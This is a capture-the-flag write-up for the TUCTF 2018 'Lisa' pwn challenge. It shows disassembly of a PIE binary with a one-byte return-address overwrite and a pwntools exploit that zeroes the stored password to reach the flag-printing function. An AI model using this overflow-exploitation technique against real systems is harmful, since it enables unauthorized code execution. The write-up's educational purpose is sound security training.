[](ctf=tu-ctf-2018)
[](type=pwn)
[](tags=rop)
[](tools=radare2,gdb-peda,pwntools,python)

# Lisa

We are given a [binary](../lisa) which leaks a heap address and has a stack based buffer overflow allowing us to overwrite at most 1 byte of the saved return address.

```bash
vagrant@amy:~/share/lisa$ file lisa
lisa: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7f2cd300a5518deec5cb00e27dae466022fdacd9, not stripped
```

`PIE` and `NX` enabled.

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

With these constraints, we can jump to the following locations:

```assembly
...
│           0x00000d01      8d8340000000   lea eax, [ebx + 0x40]       ; "4" ; '@'
│           0x00000d07      8b10           mov edx, dword [eax]
│           0x00000d09      8d8348000000   lea eax, [ebx + 0x48]       ; 'H'
│           0x00000d0f      8b00           mov eax, dword [eax]
│           0x00000d11      6a2b           push 0x2b                   ; '+' ; size_t nbyte
│           0x00000d13      52             push edx                    ; void *buf
│           0x00000d14      50             push eax                    ; int fildes
│           0x00000d15      e836f8ffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00000d1a      83c40c         add esp, 0xc
│           0x00000d1d      e89cfaffff     call sym.checkPass
│           0x00000d22      b800000000     mov eax, 0
│           0x00000d27      8b5dfc         mov ebx, dword [local_4h]
│           0x00000d2a      c9             leave
└           0x00000d2b      c3             ret
...
```

Essentially, we can jump to any location between `0xd00` and `0xdff`.

The initial user input is conveniently stored in such a manner that when we return from the call to `sym.checkPass`, our initial input is stored on the top of the stack giving us full control with a ROP chain. One caveat though is that we don't have an infoleak to give us a binary address which is unfortunately necessary as the binary is compiled with `PIE`.

```assembly
[0x000005f0]> pdf @sym.checkPass
┌ (fcn) sym.checkPass 68
│   sym.checkPass ();
│           ; var int local_18h @ ebp-0x18
│           ; CALL XREF from sym.main (0xd1d)
│           0x000007be      55             push ebp
│           0x000007bf      89e5           mov ebp, esp
│           0x000007c1      83ec18         sub esp, 0x18
│           0x000007c4      e863050000     call sym.__x86.get_pc_thunk.ax
│           0x000007c9      0537380000     add eax, 0x3837             ; '78'
│           0x000007ce      8d9040000000   lea edx, [eax + 0x40]       ; "4" ; '@'
│           0x000007d4      8b12           mov edx, dword [edx]
│           0x000007d6      8d8044000000   lea eax, [eax + 0x44]       ; 'D'
│           0x000007dc      8b00           mov eax, dword [eax]
│           0x000007de      52             push edx
│           0x000007df      50             push eax
│           0x000007e0      e8aeffffff     call sym.doStrcmp
│           0x000007e5      83c408         add esp, 8
│           0x000007e8      85c0           test eax, eax
│       ┌─< 0x000007ea      7407           je 0x7f3
│       │   0x000007ec      e811000000     call sym.lisa
│      ┌──< 0x000007f1      eb0c           jmp 0x7ff
│      ││   ; CODE XREF from sym.checkPass (0x7ea)
│      │└─> 0x000007f3      8d45e8         lea eax, [local_18h]
│      │    0x000007f6      50             push eax
│      │    0x000007f7      e864ffffff     call sym.fail
│      │    0x000007fc      83c404         add esp, 4
│      │    ; CODE XREF from sym.checkPass (0x7f1)
│      └──> 0x000007ff      90             nop
│           0x00000800      c9             leave
└           0x00000801      c3             ret
```

If we can somehow call `sym.lisa`, we can print out the flag.

The heap address which is leaked is the address of where the password to which the input is compared to is stored. By returning to the call to `read` in `main`, we can overwrite the stored password with 0x0 bytes allowing us to pass the password check and therefore calling `lisa`.

```bash
vagrant@amy:~/share/lisa$ ./lisa
Here's your share: 0x56bc7008
What? The Mona Lisa!
Look, if you want somethin' from me, I'm gonna need somethin' from you alright...
```

Exploit:

```python
from pwn import *

context(arch='i386', os='linux')
# p = process('./lisa')
p = remote('18.191.244.121', 12345)

p.recvuntil('share: ')
leak = p.recvuntil('\n').strip()
leak = int(leak, 16)
heap_base = leak & 0xfffffff0

payload = ''
payload += p32(0)
payload += p32(leak)
payload += p32(1)
p.sendline(payload)

payload = ''
payload += 'a' * 24
payload += 'cccc'
payload += '\x15'
payload = payload.ljust(0x2b, '\x00')

p.send(payload)
p.send('\x00')

s = p.recv()
print s
p.interactive()
```

Flag

```
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!>''''''<!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!'''''`             ``'!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!''`          .....         `'!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!'`      .      :::::'            `'!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!'     .   '     .::::'                `!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!'      :          `````                   `!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!        .,cchcccccc,,.                       `!!!!!!!!!!!!
!!!!!!!!!!!!!!!     .-"?$$$$$$$$$$$$$$c,                      `!!!!!!!!!!!
!!!!!!!!!!!!!!    ,ccc$$$$$$$$$$$$$$$$$$$,                     `!!!!!!!!!!
!!!!!!!!!!!!!    z$$$$$$$$$$$$$$$$$$$$$$$$;.                    `!!!!!!!!!
!!!!!!!!!!!!    <$$$$$$$$$$$$$$$$$$$$$$$$$$:.                    `!!!!!!!!
!!!!!!!!!!!     $$$$$$$$$$$$$$$$$$$$$$$$$$$h;:.                   !!!!!!!!
!!!!!!!!!!'     $$$$$$$$$$$$$$$$$$$$$$$$$$$$$h;.                   !!!!!!!
!!!!!!!!!'     <$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                   !!!!!!!
!!!!!!!!'      `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F                   `!!!!!!
!!!!!!!!        c$$$$???$$$$$$$P""  """??????"                      !!!!!!
!!!!!!!         `"" .,.. "$$$$F    .,zcr                            !!!!!!
    TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}
!!!!!!!!        <. $$c= <$d$$$   <$$$$=-=+"$$$$$$$                  !!!!!!
!!!!!!!         d$$$hcccd$$$$$   d$$$hcccd$$$$$$$F                  `!!!!!
!!!!!!         ,$$$$$$$$$$$$$$h d$$$$$$$$$$$$$$$$                   `!!!!!
!!!!!          `$$$$$$$$$$$$$$$<$$$$$$$$$$$$$$$$'                    !!!!!
!!!!!          `$$$$$$$$$$$$$$$$"$$$$$$$$$$$$$P>                     !!!!!
!!!!!           ?$$$$$$$$$$$$??$c`$$$$$$$$$$$?>'                     `!!!!
!!!!!           `?$$$$$$I7?""    ,$$$$$$$$$?>>'                       !!!!
!!!!!.           <<?$$$$$$c.    ,d$$?$$$$$F>>''                       `!!!
!!!!!!            <i?$P"??$$r--"?""  ,$$$$h;>''                       `!!!
!!!!!!             $$$hccccccccc= cc$$$$$$$>>'                         !!!
!!!!!              `?$$$$$$F""""  `"$$$$$>>>''                         `!!
!!!!!                "?$$$$$cccccc$$$$??>>>>'                           !!
!!!!>                  "$$$$$$$$$$$$$F>>>>''                            `!
!!!!!                    "$$$$$$$$???>'''                                !
!!!!!>                     `"""""                                        `
!!!!!!;                       .                                          `
!!!!!!!                       ?h.
!!!!!!!!                       $$c,
!!!!!!!!>                      ?$$$h.              .,c
!!!!!!!!!                       $$$$$$$$$hc,.,,cc$$$$$
!!!!!!!!!                  .,zcc$$$$$$$$$$$$$$$$$$$$$$
!!!!!!!!!               .z$$$$$$$$$$$$$$$$$$$$$$$$$$$$
!!!!!!!!!             ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$          .
!!!!!!!!!           ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$         !!
!!!!!!!!!         ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$        ,!'
!!!!!!!!>        c$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$.       !'
!!!!!!''       ,d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>       '
!!!''         z$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>
!'           ,$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>             ..
            z$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'           ;!!!!''`
            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F       ,;;!'`'  .''
           <$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$>    ,;'`'  ,;
           `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$F   -'   ,;!!'
            "?$$$$$$$$$$?$$$$$$$$$$$$$$$$$$$$$$$$$$F     .<!!!'''       <!
         !>    ""??$$$?C3$$$$$$$$$$$$$$$$$$$$$$$$""     ;!'''          !!!
       ;!!!!;,      `"''""????$$$$$$$$$$$$$$$$""   ,;-''               ',!
      ;!!!!<!!!; .                `"""""""""""    `'                  ' '
      !!!! ;!!! ;!!!!>;,;, ..                  ' .                   '  '
     !!' ,;!!! ;'`!!!!!!!!;!!!!!;  .        >' .''                 ;
    !!' ;!!'!';! !! !!!!!!!!!!!!!  '         -'
   <!!  !! `!;! `!' !!!!!!!!!!<!       .
   `!  ;!  ;!!! <' <!!!! `!!! <       /
  `;   !>  <!! ;'  !!!!'  !!';!     ;'
   !   !   !!! !   `!!!  ;!! !      '  '
  ;   `!  `!! ,'    !'   ;!'
      '   /`! !    <     !! <      '
           / ;!        >;! ;>
             !'       ; !! '
          ' ;!        > ! '
            '
```
> TUCTF{wh0_pu7_7h47_buff3r_7h3r3?}
